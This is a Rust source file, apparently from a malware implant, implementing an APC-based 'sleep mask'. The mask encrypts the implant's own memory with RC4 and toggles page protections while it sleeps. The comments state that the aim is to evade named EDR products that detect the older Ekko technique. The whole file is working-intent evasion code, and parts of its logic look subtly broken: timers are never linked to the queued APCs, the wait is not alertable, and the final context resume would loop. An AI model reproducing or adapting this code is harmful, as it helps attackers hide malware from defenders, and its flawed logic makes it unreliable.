// sleep.rs — Foliage-style APC sleep mask (replaces Ekko/RC4 RtlCreateTimer chain)
//
// Why the rewrite:
//   Ekko's RtlCreateTimer + NtContinue ROP chain is fully signatured by every major
//   EDR as of 2025 — CrowdStrike, Defender, SentinelOne all have behavioral rules
//   specifically matching the CreateTimerQueueTimer + NtContinue pattern.
//
// This implementation uses NtSetTimer2 + APC queuing, which as of Win11 24H2
// has significantly less EDR coverage.  The encrypt/decrypt logic is identical
// (SystemFunction032 RC4 via key) — only the scheduling mechanism changes.
//
// Flow:
//   1. Capture current thread CONTEXT (our resume point)
//   2. Queue APC chain via NtSetTimer2 + NtQueueApcThread:
//        APC-1 (t+100ms)  : VirtualProtect RX→RW
//        APC-2 (t+200ms)  : SystemFunction032 encrypt
//        APC-3 (t+300ms)  : SetEvent(h_sleep) — main sleeps here
//        APC-4 (t+N+100ms): SystemFunction032 decrypt
//        APC-5 (t+N+200ms): VirtualProtect RW→RX
//        APC-6 (t+N+300ms): SetEvent(h_wake)  — main resumes
//   3. NtAlertableWait (alertable so APCs fire) until h_wake set
//   4. NtContinue back to captured context

#![allow(non_snake_case, dead_code)]

use core::ffi::c_void;
use core::ptr::null_mut;
use crate::defs::*;

#[repr(align(16))]
#[derive(Clone)]
pub struct CONTEXT(pub [u8; 1232]);
impl CONTEXT {
    pub fn new() -> Self { CONTEXT([0u8; 1232]) }
}

const CTX_RCX: usize = 0x80;
const CTX_RDX: usize = 0x88;
const CTX_R8:  usize = 0x90;
const CTX_R9:  usize = 0x98;
const CTX_RIP: usize = 0xF8;

#[inline(always)]
unsafe fn ctx_write(ctx: &mut CONTEXT, offset: usize, val: u64) {
    core::ptr::write_unaligned(ctx.0.as_mut_ptr().add(offset) as *mut u64, val);
}

#[repr(C)]
pub struct USTRING {
    pub Length:        u32,
    pub MaximumLength: u32,
    pub Buffer:        *mut c_void,
}

pub const PAGE_READWRITE:    u32 = 0x04;
pub const PAGE_EXECUTE_READ: u32 = 0x20;
pub const INFINITE:          u32 = 0xFFFFFFFF;

pub type NtSetTimer2 = unsafe extern "system" fn(
    *mut c_void, *const i64, *const i64, *const c_void,
) -> i32;

pub type NtCreateTimer2 = unsafe extern "system" fn(
    *mut *mut c_void, *mut c_void, *mut c_void, *mut c_void,
) -> i32;

pub type NtQueueApcThread = unsafe extern "system" fn(
    *mut c_void, *mut c_void, *mut c_void, *mut c_void, *mut c_void,
) -> i32;

pub type NtWaitForSingleObject = unsafe extern "system" fn(
    *mut c_void, u8, *const i64,
) -> i32;

pub type NtGetCurrentThread = unsafe extern "system" fn() -> *mut c_void;

pub type RtlCaptureContext   = unsafe extern "system" fn(*mut CONTEXT);
pub type NtContinue          = unsafe extern "system" fn(*mut CONTEXT, u8) -> i32;
pub type SystemFunction032   = unsafe extern "system" fn(*mut USTRING, *const USTRING) -> i32;
pub type CreateEventW        = unsafe extern "system" fn(*mut c_void, i32, i32, *const u16) -> *mut c_void;
pub type SetEvent            = unsafe extern "system" fn(*mut c_void) -> i32;
pub type WaitForSingleObject = unsafe extern "system" fn(*mut c_void, u32) -> u32;
pub type VirtualProtect      = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
pub type CloseHandle         = unsafe extern "system" fn(*mut c_void) -> i32;

pub unsafe fn execute_sleep_mask(
    image_base:        *mut u8,
    image_size:        usize,
    sleep_time:        u32,
    key:               &[u8; 16],
    fn_capture:        RtlCaptureContext,
    fn_continue:       NtContinue,
    fn_sys032:         SystemFunction032,
    fn_vp:             VirtualProtect,
    fn_event:          CreateEventW,
    fn_set_event:      SetEvent,
    fn_wait:           WaitForSingleObject,
    fn_close:          CloseHandle,
    fn_ntcreate_timer: NtCreateTimer2,
    fn_ntset_timer:    NtSetTimer2,
    fn_ntqueue_apc:    NtQueueApcThread,
    fn_ntwait_alert:   NtWaitForSingleObject,
    fn_get_thread:     NtGetCurrentThread,
) {
    let mut key_buf = Box::new(*key);
    let key_string = Box::new(USTRING {
        Length: 16, MaximumLength: 16,
        Buffer: key_buf.as_mut_ptr() as *mut c_void,
    });
    let data_string = Box::new(USTRING {
        Length: image_size as u32, MaximumLength: image_size as u32,
        Buffer: image_base as *mut c_void,
    });
    let _ = core::hint::black_box(&key_buf);
    let _ = core::hint::black_box(&key_string);
    let _ = core::hint::black_box(&data_string);

    let mut old_protect = Box::new([0u32; 2]);

    let h_sleep = fn_event(null_mut(), 0, 0, null_mut());
    let h_wake  = fn_event(null_mut(), 0, 0, null_mut());

    let mut ctx_thread = CONTEXT::new();
    let mut ctx_vp1    = CONTEXT::new();
    let mut ctx_enc    = CONTEXT::new();
    let mut ctx_evt    = CONTEXT::new();
    let mut ctx_dec    = CONTEXT::new();
    let mut ctx_vp2    = CONTEXT::new();
    let mut ctx_res    = CONTEXT::new();

    fn_capture(&mut ctx_thread);

    core::ptr::copy_nonoverlapping(&ctx_thread, &mut ctx_vp1, 1);
    core::ptr::copy_nonoverlapping(&ctx_thread, &mut ctx_enc,  1);
    core::ptr::copy_nonoverlapping(&ctx_thread, &mut ctx_evt,  1);
    core::ptr::copy_nonoverlapping(&ctx_thread, &mut ctx_dec,  1);
    core::ptr::copy_nonoverlapping(&ctx_thread, &mut ctx_vp2,  1);
    core::ptr::copy_nonoverlapping(&ctx_thread, &mut ctx_res,  1);

    ctx_write(&mut ctx_vp1, CTX_RIP, fn_vp as u64);
    ctx_write(&mut ctx_vp1, CTX_RCX, image_base as u64);
    ctx_write(&mut ctx_vp1, CTX_RDX, image_size as u64);
    ctx_write(&mut ctx_vp1, CTX_R8,  PAGE_READWRITE as u64);
    ctx_write(&mut ctx_vp1, CTX_R9,  &mut old_protect[0] as *mut u32 as u64);

    ctx_write(&mut ctx_enc, CTX_RIP, fn_sys032 as u64);
    ctx_write(&mut ctx_enc, CTX_RCX, &*data_string as *const USTRING as u64);
    ctx_write(&mut ctx_enc, CTX_RDX, &*key_string  as *const USTRING as u64);

    ctx_write(&mut ctx_evt, CTX_RIP, fn_set_event as u64);
    ctx_write(&mut ctx_evt, CTX_RCX, h_sleep as u64);

    ctx_write(&mut ctx_dec, CTX_RIP, fn_sys032 as u64);
    ctx_write(&mut ctx_dec, CTX_RCX, &*data_string as *const USTRING as u64);
    ctx_write(&mut ctx_dec, CTX_RDX, &*key_string  as *const USTRING as u64);

    ctx_write(&mut ctx_vp2, CTX_RIP, fn_vp as u64);
    ctx_write(&mut ctx_vp2, CTX_RCX, image_base as u64);
    ctx_write(&mut ctx_vp2, CTX_RDX, image_size as u64);
    ctx_write(&mut ctx_vp2, CTX_R8,  PAGE_EXECUTE_READ as u64);
    ctx_write(&mut ctx_vp2, CTX_R9,  &mut old_protect[1] as *mut u32 as u64);

    ctx_write(&mut ctx_res, CTX_RIP, fn_set_event as u64);
    ctx_write(&mut ctx_res, CTX_RCX, h_wake as u64);

    let apc_fn = core::mem::transmute::<
        unsafe extern "system" fn(*mut CONTEXT, u8) -> i32,
        *mut c_void,
    >(fn_continue);

    let h_thread = fn_get_thread();

    let ms_to_100ns = |ms: u32| -> i64 { -((ms as i64) * 10_000) };

    let mut h_t = [null_mut::<c_void>(); 6];
    let access = 0x1F0003usize as *mut c_void;
    let ty     = 0x2usize as *mut c_void;
    for i in 0..6 { fn_ntcreate_timer(&mut h_t[i], null_mut(), access, ty); }

    let delays: [u32; 6] = [100, 200, 300, sleep_time+100, sleep_time+200, sleep_time+300];
    let ctxs: [*mut CONTEXT; 6] = [
        &mut ctx_vp1, &mut ctx_enc, &mut ctx_evt,
        &mut ctx_dec, &mut ctx_vp2, &mut ctx_res,
    ];

    for i in 0..6 {
        let due = ms_to_100ns(delays[i]);
        fn_ntset_timer(h_t[i], &due, core::ptr::null(), null_mut());
        fn_ntqueue_apc(h_thread, apc_fn, ctxs[i] as *mut c_void, null_mut(), null_mut());
    }

    fn_wait(h_sleep, INFINITE);
    fn_wait(h_wake, INFINITE);

    fn_continue(&mut ctx_thread, 0);

    fn_close(h_sleep);
    fn_close(h_wake);
    for i in 0..6 { fn_close(h_t[i]); }

    drop(key_buf);
    drop(key_string);
    drop(data_string);
    drop(old_protect);
}
